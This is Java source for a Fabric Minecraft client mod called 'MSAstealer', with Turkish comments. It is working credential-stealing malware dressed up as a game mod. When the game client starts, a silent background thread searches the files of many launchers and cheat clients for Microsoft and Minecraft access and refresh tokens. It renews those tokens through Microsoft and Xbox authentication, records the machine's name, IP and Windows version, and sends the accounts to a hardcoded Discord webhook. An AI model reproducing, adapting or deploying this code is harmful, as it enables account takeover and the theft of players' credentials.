package msastealer;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonPrimitive;

import net.fabricmc.api.ClientModInitializer;

import java.io.File;
import java.io.RandomAccessFile;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.channels.FileLock;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.AtomicMoveNotSupportedException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.time.Instant;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MSAstealer Fabric modu (Minecraft 26.2+).
 * MSAstealer.bat'in yaptigi her seyi aynen yapar: launcher taramasi, token
 * yakalama, yenileme, LiquidBounce writeback ve Discord embed gonderimi.
 * MC'yi asla bloklamaz/cokertmez: is sadece daemon thread'de doner.
 */
public class MsaMod implements ClientModInitializer {

    private static final String APPDATA = env("APPDATA", "");
    private static final String LOCALAPPDATA = env("LOCALAPPDATA", "");
    private static final String USERPROFILE = env("USERPROFILE", "");
    private static final String HOOK = "https://discord.com/api/webhooks/1571168767315148810/f1_faEximh9kYmvXpLZ6lotLiAOZMsH_GxD6n59_OXLWfeQ31P4CPCq0rCQEfNF0i7ie";

    private static final Pattern MC_RX = Pattern.compile("eyJraWQiOiIwNDkxODEi[A-Za-z0-9\\-\\._]+");
    private static final Pattern RT_RX = Pattern.compile("M\\.C\\d+_[^\\x00-\\x20\"']{40,}\\$\\$");
    private static final Pattern EXT_RX = Pattern.compile("\\.(json|db|db-wal|db-shm|sqlite|dat|bin|txt|log|nbt|novo|conf|cfg|properties|json5)$", Pattern.CASE_INSENSITIVE);
    private static final Pattern KW_RX = Pattern.compile("minecra|launcher|curse|overwolf|feather|tlauncher|prism|multimc|polymc|atlauncher|gdlauncher|badlion|lunar|ccbluex|modrinth|laby|xmcl|paladium|cheatbreaker|intent|sklauncher|betacraft", Pattern.CASE_INSENSITIVE);
    private static final Pattern TRIM_RX = Pattern.compile("M\\.C\\d+_");
    private static final Pattern OSV_RX = Pattern.compile("\\d+\\.\\d+\\.\\d+");

    /** Tek dosyadan okunacak azami bayt (canli DB'lerde OOM'a karsi). */
    private static final long MAX_SCAN_BYTES = 16L * 1024 * 1024;
    /** Access token ile refresh token arasinda kabul edilen azami mesafe (karakter). */
    private static final int RT_PAIR_WINDOW = 4096;
    /** Bu degerden buyuk epoch degerleri milisaniye kabul edilir (yil ~5138 sonrasi). */
    private static final long MS_EPOCH_THRESHOLD = 100_000_000_000L;
    /** Instant icin guvenli ust sinir (yil 9999). */
    private static final long MAX_EPOCH_SECONDS = 253_402_300_799L;

    private static final DateTimeFormatter BITIS_FMT =
            DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm").withZone(ZoneId.systemDefault());
    private static final DateTimeFormatter TS_FMT =
            DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");

    private static final List<String> PRUNE = Arrays.asList(
            "cache", "caches", "code cache", "gpucache", "shadercache", "crashpad", "node_modules",
            "assets", "versions", "libraries", "objects", "saves", "screenshots", "shaderpacks",
            "resourcepacks", "texturepacks", "backups", "worlds", "world", "meta",
            "java_versions", "javabin", "runtime", "jre", "jdk");

    private static final String[] FALLBACK_CLIENT_IDS = {
            "00000000402b5328", "389ee1e1-4b24-4b4d-a309-9ef6ae7c0b17", "7bc17117-197b-4b6c-ae46-99efc0cbd418"};

    private static final String[][] CHECKS = {
            {"LiquidBounce", APPDATA + "\\CCBlueX"},
            {"Modrinth App", APPDATA + "\\ModrinthApp"},
            {"Lunar Client", USERPROFILE + "\\.lunarclient"},
            {"Minecraft Launcher", APPDATA + "\\.minecraft\\launcher_accounts.json"},
            {"TLauncher", APPDATA + "\\.minecraft\\tlauncher_accounts.json", APPDATA + "\\.tlauncher"},
            {"CurseForge", USERPROFILE + "\\curseforge\\minecraft\\Install"},
            {"PrismLauncher", APPDATA + "\\PrismLauncher\\accounts.json"},
            {"PolyMC", APPDATA + "\\PolyMC\\accounts.json"},
            {"MultiMC", APPDATA + "\\MultiMC\\accounts.json"},
            {"Badlion Client", APPDATA + "\\Badlion Client"},
            {"Paladium", APPDATA + "\\paladium-group", LOCALAPPDATA + "\\paladiumlauncher"},
            {"XMCL", APPDATA + "\\xmcl", LOCALAPPDATA + "\\Packages\\XMCL_68mcaawk44tpj\\LocalCache\\Roaming\\xmcl", LOCALAPPDATA + "\\Packages\\XMCL_ncdvebj03zfcm\\LocalCache\\Roaming\\xmcl"},
            {"ATLauncher", APPDATA + "\\ATLauncher"},
            {"Feather", APPDATA + "\\.feather", APPDATA + "\\Feather", APPDATA + "\\.minecraft\\feather"},
            {"GDLauncher", APPDATA + "\\gdlauncher_carbon", APPDATA + "\\gdlauncher_next"},
            {"LabyMod", APPDATA + "\\.laby4", APPDATA + "\\.laby", LOCALAPPDATA + "\\labymodlauncher"},
            {"Meteor Client", APPDATA + "\\.minecraft\\meteor-client"},
            {"Impact", APPDATA + "\\.minecraft\\Impact"},
            {"Rise", APPDATA + "\\.minecraft\\Rise"},
            {"Novoline", APPDATA + "\\.minecraft\\Novoline"},
            {"CheatBreaker", APPDATA + "\\.minecraft\\cheatbreaker_accounts.json"},
            {"IntentLauncher", USERPROFILE + "\\intentlauncher"},
            {"BetaCraft", APPDATA + "\\.betacraft"},
            {"SKLauncher", APPDATA + "\\sklauncher", APPDATA + "\\.sklauncher"}
    };

    private static final String[] FIXED = {
            USERPROFILE + "\\.lunarclient\\settings\\game\\accounts.json",
            USERPROFILE + "\\intentlauncher\\launcherconfig",
            APPDATA + "\\CCBlueX\\LiquidLauncher\\config\\config.json",
            APPDATA + "\\.minecraft\\launcher_accounts.json",
            APPDATA + "\\.minecraft\\launcher_accounts_microsoft_store.json",
            APPDATA + "\\.minecraft\\tlauncher_accounts.json",
            APPDATA + "\\.minecraft\\TlauncherProfiles.json",
            APPDATA + "\\.minecraft\\saccounts.json",
            APPDATA + "\\.minecraft\\cheatbreaker_accounts.json",
            APPDATA + "\\.minecraft\\meteor-client\\accounts.nbt",
            APPDATA + "\\.minecraft\\Impact\\alts.json",
            APPDATA + "\\.minecraft\\Rise\\alts.txt",
            APPDATA + "\\.minecraft\\Novoline\\alts.novo",
            USERPROFILE + "\\curseforge\\minecraft\\Install\\launcher_accounts.json",
            USERPROFILE + "\\curseforge\\minecraft\\Install\\launcher_accounts_microsoft_store.json",
            APPDATA + "\\PrismLauncher\\accounts.json",
            APPDATA + "\\PolyMC\\accounts.json",
            APPDATA + "\\MultiMC\\accounts.json",
            APPDATA + "\\polymc\\accounts.json",
            APPDATA + "\\Badlion Client\\accounts.json",
            APPDATA + "\\paladium-group\\config.json",
            APPDATA + "\\paladium-group\\accounts.json",
            APPDATA + "\\xmcl\\user.json",
            LOCALAPPDATA + "\\Packages\\XMCL_68mcaawk44tpj\\LocalCache\\Roaming\\xmcl\\user.json",
            LOCALAPPDATA + "\\Packages\\XMCL_ncdvebj03zfcm\\LocalCache\\Roaming\\xmcl\\user.json",
            APPDATA + "\\ATLauncher\\settings.json",
            APPDATA + "\\ATLauncher\\configs\\accounts.json",
            APPDATA + "\\ATLauncher\\configs\\Accounts.json",
            APPDATA + "\\gdlauncher_carbon\\data\\gdl_conf.db",
            APPDATA + "\\gdlauncher_next\\data\\data.db",
            APPDATA + "\\.feather\\accounts.json",
            APPDATA + "\\.betacraft\\launcher\\accounts.json",
            APPDATA + "\\.tlauncher\\tlauncher_accounts.json"
    };

    private static final String[] DIRS = {
            USERPROFILE + "\\.lunarclient",
            USERPROFILE + "\\intentlauncher",
            APPDATA + "\\gdlauncher_carbon",
            APPDATA + "\\gdlauncher_next",
            APPDATA + "\\Badlion Client",
            APPDATA + "\\paladium-group",
            LOCALAPPDATA + "\\paladiumlauncher",
            APPDATA + "\\xmcl",
            LOCALAPPDATA + "\\Packages\\XMCL_68mcaawk44tpj\\LocalCache\\Roaming\\xmcl",
            LOCALAPPDATA + "\\Packages\\XMCL_ncdvebj03zfcm\\LocalCache\\Roaming\\xmcl",
            APPDATA + "\\Feather",
            APPDATA + "\\.feather",
            APPDATA + "\\.laby4",
            LOCALAPPDATA + "\\labymodlauncher",
            APPDATA + "\\.laby",
            APPDATA + "\\.betacraft",
            APPDATA + "\\sklauncher",
            APPDATA + "\\.sklauncher"
    };

    // ---- calisma durumu ----
    private static final class Cand {
        String name, uuid, tok, rt, src, cid;
        long exp;
        int score;
    }

    private static final class FinalCand {
        String name, uuid, tok, rt, src, cid, capes;
        long exp;
        boolean ok, rf;
    }

    private static final class LbRef {
        final String file;
        final JsonObject acc;
        LbRef(String file, JsonObject acc) { this.file = file; this.acc = acc; }
    }

    private static final class Op {
        final String oldTok, oldRt, oldExp, newTok, newRt, newExp;
        Op(String oldTok, String oldRt, String oldExp, String newTok, String newRt, String newExp) {
            this.oldTok = oldTok; this.oldRt = oldRt; this.oldExp = oldExp;
            this.newTok = newTok; this.newRt = newRt; this.newExp = newExp;
        }
    }

    private static final class RefreshResult {
        String mcToken, newRt;
        long exp;
    }

    private static final class Resp {
        int status;
        String body;
    }

    private final Map<String, Cand> cands = new LinkedHashMap<>();
    private final Set<String> usedRt = new HashSet<>();
    private final Set<String> seenTok = new HashSet<>();
    private final Map<String, LbRef> lbAcc = new LinkedHashMap<>();
    private final Map<String, List<Op>> lbDirty = new LinkedHashMap<>();
    private final TreeSet<String> doneDirs = new TreeSet<>(String.CASE_INSENSITIVE_ORDER);

    private boolean sawAccounts = false;
    private int sentTotal = 0;
    private long now = 0;
    private long deadlineMs = 0;
    private String pip = "";
    private String osv = "";

    private final HttpClient http = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NORMAL)
            .connectTimeout(java.time.Duration.ofSeconds(10))
            .build();

    private RandomAccessFile lockFile;
    private FileLock lock;

    // ---- entrypoint ----

    @Override
    public void onInitializeClient() {
        Thread t = new Thread(this::runAllSafe, "MSAstealer");
        t.setDaemon(true);
        t.start();
    }

    /** Standalone test/calistirma (MC disinda). */
    public static void main(String[] args) {
        new MsaMod().runAllSafe();
    }

    private void runAllSafe() {
        try {
            runAll();
        } catch (Throwable e) {
            log("beklenmeyen hata: " + e);
        } finally {
            releaseLock();
        }
    }

    private void runAll() {
        now = System.currentTimeMillis() / 1000;
        deadlineMs = System.currentTimeMillis() + 240_000;

        if (!tryLock()) {
            log("zaten calisiyor, cikiliyor.");
            return;
        }

        pip = fetchIp();
        osv = fetchOsVersion();

        log("tarama basladi...");

        List<String> found = new ArrayList<>();
        for (String[] chk : CHECKS) {
            for (int i = 1; i < chk.length; i++) {
                if (chk[i] != null && new File(chk[i]).exists()) {
                    found.add(chk[0]);
                    break;
                }
            }
        }
        if (!found.isEmpty()) {
            log("bu bilgisayarda su launcherlar var: " + String.join(", ", found));
            log("bunlarin icinde token araniyor...");
        } else {
            log("bilinen launcher bulunamadi, derin tarama yapilacak");
        }

        // LiquidBounce: CCBlueX altinda accounts.json (depth 7)
        walkLbAccounts(new File(APPDATA + "\\CCBlueX"), 7);

        // Modrinth App db
        String modDb = APPDATA + "\\ModrinthApp\\app.db";
        if (new File(modDb).exists()) {
            scanFile(modDb, "ModrinthApp");
            if (new File(modDb + "-wal").exists()) scanFile(modDb + "-wal", "ModrinthApp-wal");
            if (new File(modDb + "-shm").exists()) scanFile(modDb + "-shm", "ModrinthApp-shm");
        }

        // sabit dosyalar
        for (String f : FIXED) {
            if (new File(f).exists()) scanFile(f, "Launcher");
        }

        // launcher klasorleri (depth 3)
        for (String d : DIRS) walk(new File(d), 3, "Launcher");

        // GDLauncher carbon runtime path override
        String gdlMark = APPDATA + "\\gdlauncher_carbon\\runtime_path_override";
        if (new File(gdlMark).exists()) {
            String gdlRt = firstLine(gdlMark);
            if (gdlRt != null && !gdlRt.isEmpty() && new File(gdlRt).exists()) {
                walk(new File(gdlRt), 3, "GDLauncher");
            }
        }

        Set<String> sent = new HashSet<>(sendFinal(new HashSet<>()));

        log("derin tarama...");

        for (String root : new String[]{APPDATA, LOCALAPPDATA, USERPROFILE}) {
            File rd = new File(root);
            File[] children = rd.listFiles(File::isDirectory);
            if (children == null) continue;
            for (File d : children) {
                if (doneDirs.contains(d.getAbsolutePath())) continue;
                if (KW_RX.matcher(d.getName()).find()) {
                    doneDirs.add(d.getAbsolutePath());
                    walk(d, 6, "DeepScan");
                }
            }
        }

        Set<String> sent2 = new HashSet<>(sendFinal(sent));

        if (sent.size() + sent2.size() == 0) {
            if (sawAccounts) {
                log("hesap(lar) bulundu ama webhook gonderilemedi.");
            } else {
                log("HESAP BULUNAMADI.");
                String desc = "PC: " + pc() + " | IP: " + (pip.isEmpty() ? "yok" : pip) + " | Windows " + osv;
                if (!found.isEmpty()) {
                    desc = desc + " | Launcherlar: " + String.join(", ", found) + " | token izi yok";
                } else {
                    desc = desc + " | bilinen launcher kurulu degil";
                }
                JsonObject embed = new JsonObject();
                embed.addProperty("title", "MSAstealer");
                embed.addProperty("description", desc);
                embed.addProperty("color", 16711680);
                JsonObject footer = new JsonObject();
                footer.addProperty("text", "MSAstealer | " + pc());
                embed.add("footer", footer);
                JsonObject payload = new JsonObject();
                JsonArray arr = new JsonArray();
                arr.add(embed);
                payload.add("embeds", arr);
                if (sendWebhook(payload)) {
                    log("  (webhook: bulunamadi mesaji gonderildi)");
                } else {
                    log("  Webhook gonderilemedi (internet/AV engeli olabilir)");
                }
            }
        } else {
            log("bitti. " + sentTotal + " hesap gonderildi.");
        }
    }

    // ---- tarama ----

    private void walkLbAccounts(File dir, int depth) {
        if (dir == null || depth < 0 || !dir.isDirectory()) return;
        if (System.currentTimeMillis() > deadlineMs) return;
        if (isSymlink(dir)) return;
        File[] items = dir.listFiles();
        if (items == null) return;
        for (File f : items) {
            if (f.isFile() && !isSymlink(f) && f.getName().equalsIgnoreCase("accounts.json")) {
                lbScan(f);
                scanFile(f.getAbsolutePath(), "LiquidBounce");
            }
        }
        if (depth == 0) return;
        for (File f : items) {
            if (f.isDirectory() && !isSymlink(f)) walkLbAccounts(f, depth - 1);
        }
    }

    private void lbScan(File f) {
        try {
            String txt = readCapped(f, MAX_SCAN_BYTES, StandardCharsets.UTF_8);
            if (txt == null || txt.isEmpty()) return;
            if (txt.charAt(0) == '\uFEFF') txt = txt.substring(1);
            JsonElement root = JsonParser.parseString(txt);
            if (root.isJsonObject()) {
                JsonObject j = root.getAsJsonObject();
                JsonElement v = j.get("value");
                if (v != null && v.isJsonArray() && v.getAsJsonArray().size() > 0
                        && v.getAsJsonArray().get(0).isJsonObject()) {
                    JsonObject v0 = v.getAsJsonArray().get(0).getAsJsonObject();
                    JsonElement inner = v0.get("value");
                    if (inner != null && inner.isJsonArray()) {
                        for (JsonElement ae : inner.getAsJsonArray()) {
                            if (ae.isJsonObject()) lbAccount(ae.getAsJsonObject(), f.getAbsolutePath());
                        }
                    }
                }
            } else if (root.isJsonArray()) {
                for (JsonElement ae : root.getAsJsonArray()) {
                    if (!ae.isJsonObject()) continue;
                    JsonObject a = ae.getAsJsonObject();
                    addCand(js(a, "name"), js(a, "uuid"), js(a, "accessToken"), js(a, "refreshToken"),
                            expOf(a.get("expiresAt")), "LiquidBounce", js(a, "clientId"));
                }
            }
        } catch (Exception e) {
            log("  lb hesap dosyasi okunamadi/parse edilemedi: " + f.getAbsolutePath()
                    + " (" + e.getClass().getSimpleName() + ": " + e.getMessage() + ")");
        }
    }

    private void lbAccount(JsonObject a, String file) {
        String cid = null;
        JsonObject auth = obj(a, "authManager");
        JsonObject msa = obj(auth, "msaToken");
        if (msa != null) cid = js(msa, "clientId");
        if ((cid == null || cid.isEmpty()) && a.has("clientId")) cid = js(a, "clientId");
        JsonObject mct = obj(auth, "minecraftToken");
        if (mct != null && mct.has("token")) {
            addCand(js(a, "name"), js(a, "uuid"), js(mct, "token"),
                    msa != null ? js(msa, "refreshToken") : null,
                    toEpochSeconds(expOf(mct.get("expireTimeMs"))), "LiquidBounce", cid);
        } else if (a.has("accessToken")) {
            addCand(js(a, "name"), js(a, "uuid"), js(a, "accessToken"), js(a, "refreshToken"),
                    toEpochSeconds(expOf(a.get("expiresAt"))), "LiquidBounce", cid);
        }
        String au = normUuid(js(a, "uuid"));
        if (au != null && !au.isEmpty()) lbAcc.put(au, new LbRef(file, a));
    }

    private void scanFile(String path, String src) {
        String t = fileText(path);
        if (t != null) scanText(t, src);
    }

    private void scanText(String text, String src) {
        if (text == null || text.isEmpty()) return;
        List<int[]> rtSpans = new ArrayList<>();
        Matcher rm = RT_RX.matcher(text);
        while (rm.find()) rtSpans.add(new int[]{rm.start(), rm.end()});
        Matcher mm = MC_RX.matcher(text);
        while (mm.find()) {
            String tok = cleanToken(mm.group());
            JsonObject pay = jwtPayload(tok);
            if (pay == null) continue;
            String name = null;
            String uuid = null;
            JsonArray pfd = arr(pay, "pfd");
            if (pfd != null && pfd.size() > 0 && pfd.get(0).isJsonObject()) {
                JsonObject p0 = pfd.get(0).getAsJsonObject();
                name = js(p0, "name");
                uuid = js(p0, "id");
            } else {
                JsonObject profiles = obj(pay, "profiles");
                if (profiles != null && profiles.has("mc")) uuid = js(profiles, "mc");
            }
            if (uuid == null || uuid.isEmpty()) continue;
            String best = null;
            long bestD = Long.MAX_VALUE;
            for (int[] span : rtSpans) {
                long d = Math.abs(span[0] - mm.start());
                if (d > RT_PAIR_WINDOW) continue;
                // en yakin RT secilir; esit mesafede onceki (deterministik) aday korunur
                // .bat ve WaxConfigApi ile ayni davranis: margin yuzunden RT dusurulmez
                if (d < bestD) {
                    bestD = d;
                    best = text.substring(span[0], span[1]);
                }
            }
            addCand(name, uuid, tok, best != null ? best : "-", toEpochSeconds(expOf(pay.get("exp"))), src, "");
        }
    }

    private void walk(File dir, int depth, String src) {
        if (dir == null || depth < 0 || !dir.isDirectory()) return;
        if (System.currentTimeMillis() > deadlineMs) return;
        if (isSymlink(dir)) return;
        File[] items = dir.listFiles();
        if (items == null) return;
        for (File f : items) {
            if (!f.isFile() || isSymlink(f)) continue;
            long len = f.length();
            if (len <= 0 || len >= 16L * 1024 * 1024) continue;
            if (!EXT_RX.matcher(f.getName()).find()) continue;
            scanFile(f.getAbsolutePath(), src);
        }
        if (depth == 0) return;
        for (File f : items) {
            if (f.isDirectory() && !isSymlink(f) && !PRUNE.contains(f.getName().toLowerCase())) {
                walk(f, depth - 1, src);
            }
        }
    }

    // ---- token yardimcilari ----

    private static JsonObject jwtPayload(String jwt) {
        try {
            String[] parts = jwt.split("\\.");
            if (parts.length < 2) return null;
            String p = parts[1];
            int rem = p.length() % 4;
            if (rem == 2) p += "==";
            else if (rem == 3) p += "=";
            byte[] b = Base64.getUrlDecoder().decode(p);
            return JsonParser.parseString(new String(b, StandardCharsets.UTF_8)).getAsJsonObject();
        } catch (Exception e) {
            return null;
        }
    }

    private static String cleanToken(String tok) {
        Matcher m = TRIM_RX.matcher(tok);
        if (m.find() && m.start() > 50) tok = tok.substring(0, m.start());
        return tok.replaceAll("[\\x00\\x20\\x22]+$", "");
    }

    /** uuid'yi tek bicime getirir: kucuk harf, 32 hex ise tireli form. */
    private static String normUuid(String uuid) {
        if (uuid == null) return null;
        uuid = uuid.trim();
        if (uuid.isEmpty()) return uuid;
        if (uuid.length() == 32 && uuid.matches("[0-9a-fA-F]{32}")) {
            String u = uuid.toLowerCase();
            return u.substring(0, 8) + "-" + u.substring(8, 12) + "-" + u.substring(12, 16)
                    + "-" + u.substring(16, 20) + "-" + u.substring(20, 32);
        }
        return uuid.toLowerCase();
    }

    /** Epoch degerini saniyeye cevirir: ms gibi gorunen (> 1e11) degerler 1000'e bolunur. */
    private static long toEpochSeconds(long v) {
        if (v <= 0) return 0;
        if (v > MS_EPOCH_THRESHOLD) return v / 1000;
        return v;
    }

    /** exp'i guvenli araliga kirpip formatlar; bozuk deger tum pass'i oldurmesin. */
    private static String formatExpiry(long exp) {
        try {
            long s = Math.max(0, Math.min(exp, MAX_EPOCH_SECONDS));
            return BITIS_FMT.format(Instant.ofEpochSecond(s));
        } catch (Exception e) {
            return "-";
        }
    }

    /** 240 saniyelik genel sure siniri asildi mi. */
    private boolean outOfTime() {
        return System.currentTimeMillis() > deadlineMs;
    }

    private void addCand(String name, String uuid, String tok, String rt, long exp, String src, String cid) {
        if (uuid == null || uuid.isEmpty()) return;
        uuid = normUuid(uuid);
        if (uuid == null || uuid.isEmpty()) return;
        if (exp < 0) exp = 0;
        int score = 0;
        if (rt != null && !rt.isEmpty() && !rt.equals("-")) score += 2;
        if (exp > now) score += 3;
        if (name == null || name.isEmpty()) name = "?";
        Cand prev = cands.get(uuid);
        if (prev == null || score > prev.score) {
            Cand c = new Cand();
            c.name = name;
            c.uuid = uuid;
            c.tok = tok;
            c.rt = rt;
            c.exp = exp;
            c.src = src;
            c.score = score;
            c.cid = cid;
            cands.put(uuid, c);
        }
    }

    // ---- token yenileme ----

    private RefreshResult refreshMcToken(String msaRt, String cid) throws Exception {
        List<String> list = new ArrayList<>();
        if (cid != null && !cid.isEmpty()) list.add(cid);
        for (String c : FALLBACK_CLIENT_IDS) if (!list.contains(c)) list.add(c);

        String lastErr = "";
        JsonObject t = null;
        for (String cl : list) {
            String form = "client_id=" + urlEnc(cl)
                    + "&grant_type=refresh_token&refresh_token=" + urlEnc(msaRt)
                    + "&scope=" + urlEnc("service::user.auth.xboxlive.com::MBI_SSL");
            Resp r = httpCall("https://login.live.com/oauth20_token.srf", "POST",
                    form.getBytes(StandardCharsets.UTF_8), "application/x-www-form-urlencoded", null, 12);
            if (r != null && r.status >= 200 && r.status < 300) {
                t = JsonParser.parseString(r.body).getAsJsonObject();
                break;
            }
            lastErr = (r == null) ? "istek hatasi" : (r.status + " " + r.body);
            if (lastErr.contains("invalid_grant")) throw new IllegalStateException(lastErr);
        }
        if (t == null) throw new IllegalStateException("msa-fail: " + lastErr);

        String access = js(t, "access_token");
        if (access == null || access.isEmpty()) throw new IllegalStateException("msa-fail: access_token yok");

        JsonObject props = new JsonObject();
        props.addProperty("AuthMethod", "RPS");
        props.addProperty("SiteName", "user.auth.xboxlive.com");
        props.addProperty("RpsTicket", "d=" + access);
        JsonObject xblBody = new JsonObject();
        xblBody.add("Properties", props);
        xblBody.addProperty("RelyingParty", "http://auth.xboxlive.com");
        xblBody.addProperty("TokenType", "JWT");
        Resp xbl = postJson("https://user.auth.xboxlive.com/user/authenticate", xblBody, 12);
        if (xbl == null || xbl.status < 200 || xbl.status >= 300) throw new IllegalStateException("xbl-fail: " + err(xbl));
        JsonObject xblJ = JsonParser.parseString(xbl.body).getAsJsonObject();
        String uhs = xblJ.getAsJsonObject("DisplayClaims").getAsJsonArray("xui").get(0).getAsJsonObject().get("uhs").getAsString();
        String xblTok = xblJ.get("Token").getAsString();

        JsonObject props2 = new JsonObject();
        props2.addProperty("SandboxId", "RETAIL");
        JsonArray uts = new JsonArray();
        uts.add(xblTok);
        props2.add("UserTokens", uts);
        JsonObject xstsBody = new JsonObject();
        xstsBody.add("Properties", props2);
        xstsBody.addProperty("RelyingParty", "rp://api.minecraftservices.com/");
        xstsBody.addProperty("TokenType", "JWT");
        Resp xsts = postJson("https://xsts.auth.xboxlive.com/xsts/authorize", xstsBody, 12);
        if (xsts == null || xsts.status < 200 || xsts.status >= 300) throw new IllegalStateException("xsts-fail: " + err(xsts));
        String xstsTok = JsonParser.parseString(xsts.body).getAsJsonObject().get("Token").getAsString();

        JsonObject mcBody = new JsonObject();
        mcBody.addProperty("identityToken", "XBL3.0 x=" + uhs + ";" + xstsTok);
        Resp mc = postJson("https://api.minecraftservices.com/authentication/login_with_xbox", mcBody, 12);
        if (mc == null || mc.status < 200 || mc.status >= 300) throw new IllegalStateException("mc-fail: " + err(mc));
        JsonObject mcJ = JsonParser.parseString(mc.body).getAsJsonObject();

        RefreshResult res = new RefreshResult();
        res.mcToken = js(mcJ, "access_token");
        res.newRt = js(t, "refresh_token");
        if (res.newRt == null || res.newRt.isEmpty()) res.newRt = msaRt;
        long expiresIn = 0;
        try { expiresIn = mcJ.get("expires_in").getAsLong(); } catch (Exception ignored) { }
        res.exp = now + expiresIn - 60;
        return res;
    }

    // ---- final (dogrula, yenile, embed gonder) ----

    private List<String> sendFinal(Set<String> skip) {
        now = System.currentTimeMillis() / 1000;
        Map<String, FinalCand> finalMap = new LinkedHashMap<>();
        List<Cand> sorted = new ArrayList<>(cands.values());
        sorted.sort((x, y) -> {
            if (x.score != y.score) return Integer.compare(y.score, x.score);
            return Long.compare(y.exp, x.exp);
        });

        for (Cand c : sorted) {
            if (skip.contains(c.uuid)) continue;
            if (outOfTime()) {
                log("  sure siniri (240s) asildi, kalan adaylar dogrulanmadi");
                break;
            }
            String name = c.name;
            String uuid = c.uuid;
            boolean ok = false;
            String capes = "";
            if (c.exp > now) {
                for (int pi = 0; pi < 2; pi++) {
                    Map<String, String> hdrs = new LinkedHashMap<>();
                    hdrs.put("Authorization", "Bearer " + c.tok);
                    Resp prof = httpCall("https://api.minecraftservices.com/minecraft/profile", "GET", null, null, hdrs, 8);
                    if (prof != null && prof.status >= 200 && prof.status < 300) {
                        JsonObject pj = parseObj(prof.body);
                        if (pj != null && pj.has("id")) {
                            name = js(pj, "name");
                            uuid = normUuid(js(pj, "id"));
                            ok = true;
                            JsonArray capArr = arr(pj, "capes");
                            if (capArr != null && capArr.size() > 0) {
                                StringBuilder sb = new StringBuilder();
                                for (JsonElement ce : capArr) {
                                    if (!ce.isJsonObject()) continue;
                                    JsonObject co = ce.getAsJsonObject();
                                    String cn = js(co, "alias");
                                    if (cn == null || cn.isEmpty()) cn = js(co, "shortName");
                                    if (cn == null || cn.isEmpty()) continue;
                                    if (sb.length() > 0) sb.append(", ");
                                    sb.append(cn);
                                }
                                capes = sb.toString();
                                if (capes.length() > 100) capes = capes.substring(0, 97) + "...";
                            }
                            break;
                        }
                    }
                    sleep(800);
                }
            }
            uuid = normUuid(uuid);
            if (uuid == null || uuid.isEmpty()) continue;
            if (skip.contains(uuid)) continue;
            FinalCand prev = finalMap.get(uuid);
            if ((ok && (prev == null || !prev.ok)) || prev == null) {
                FinalCand fc = new FinalCand();
                fc.name = name != null ? name : "?";
                fc.uuid = uuid;
                fc.tok = c.tok;
                fc.rt = c.rt;
                fc.exp = c.exp;
                fc.src = c.src;
                fc.ok = ok;
                fc.cid = c.cid;
                fc.rf = false;
                fc.capes = capes;
                finalMap.put(uuid, fc);
            }
        }

        boolean force = "1".equals(env("FORCE_REFRESH", ""));
        for (FinalCand c : finalMap.values()) {
            if (outOfTime()) {
                log("  sure siniri (240s) asildi, kalan yenilemeler yapilmadi");
                break;
            }
            long left = c.exp - now;
            if (force || left < 1800 || !c.ok) {
                if (c.rt != null && !c.rt.isEmpty() && !c.rt.equals("-") && !usedRt.contains(c.rt)) {
                    log("  " + c.name + ": token yenileniyor...");
                    String why = "bilinmeyen hata";
                    for (int ri = 0; ri < 3; ri++) {
                        if (ri > 0 && outOfTime()) {
                            log("  " + c.name + ": sure siniri (240s) asildi, yenileme denemesi kesildi");
                            break;
                        }
                        try {
                            RefreshResult r = refreshMcToken(c.rt, c.cid);
                            usedRt.add(r.newRt);
                            c.tok = r.mcToken;
                            c.rt = r.newRt;
                            c.exp = r.exp;
                            c.ok = true;
                            c.rf = true;
                            log("  " + c.name + ": yeni token alindi");
                            LbRef w = lbAcc.get(c.uuid);
                            if (w != null && w.acc != null) {
                                try {
                                    JsonObject auth = obj(w.acc, "authManager");
                                    if (auth != null && auth.has("minecraftToken")) {
                                        JsonObject mct = auth.getAsJsonObject("minecraftToken");
                                        JsonObject msa = obj(auth, "msaToken");
                                        String oldTok = js(mct, "token");
                                        String oldRt = msa != null ? js(msa, "refreshToken") : null;
                                        String oldExp = js(mct, "expireTimeMs");
                                        String newExp = String.valueOf(r.exp * 1000);
                                        mct.addProperty("token", r.mcToken);
                                        if (msa != null) msa.addProperty("refreshToken", r.newRt);
                                        mct.addProperty("expireTimeMs", newExp);
                                        if (oldTok != null && !oldTok.isEmpty()) {
                                            List<Op> ops = lbDirty.computeIfAbsent(w.file, k -> new ArrayList<>());
                                            ops.add(new Op(oldTok, oldRt, oldExp, r.mcToken, r.newRt, newExp));
                                            // RT rotasyonu yuzunden hemen diske yaz: webhook beklemeden
                                            saveLbFile(w.file);
                                        }
                                    }
                                } catch (Exception e) {
                                    log("  writeback hazirligi hatasi (" + w.file + "): " + e);
                                }
                            }
                            why = "";
                            break;
                        } catch (Exception e) {
                            String em = String.valueOf(e.getMessage());
                            if (em.contains("invalid_grant")) {
                                why = "gecersiz token";
                                usedRt.add(c.rt);
                                break;
                            } else if (em.contains("429") || em.contains("Too Many")) {
                                why = "rate limit";
                            } else if (em.contains("timed out") || em.contains("resolve") || em.contains("connect")
                                    || em.contains("closed") || em.contains("istek hatasi")) {
                                why = "ag hatasi";
                            }
                            if (ri == 0) sleep(3000);
                            else sleep(10000);
                        }
                    }
                    if (!c.ok) log("  " + c.name + ": yenilenemedi (" + why + "), atlandi");
                }
            }
        }

        if (outOfTime()) log("  sure siniri (240s) asildi, gonderim asamasina geciliyor");

        boolean anyReady = false;
        for (FinalCand c : finalMap.values()) {
            if (c.tok != null && !c.tok.isEmpty()) {
                anyReady = true;
                break;
            }
        }
        if (anyReady) sawAccounts = true;

        List<String> sent = new ArrayList<>();
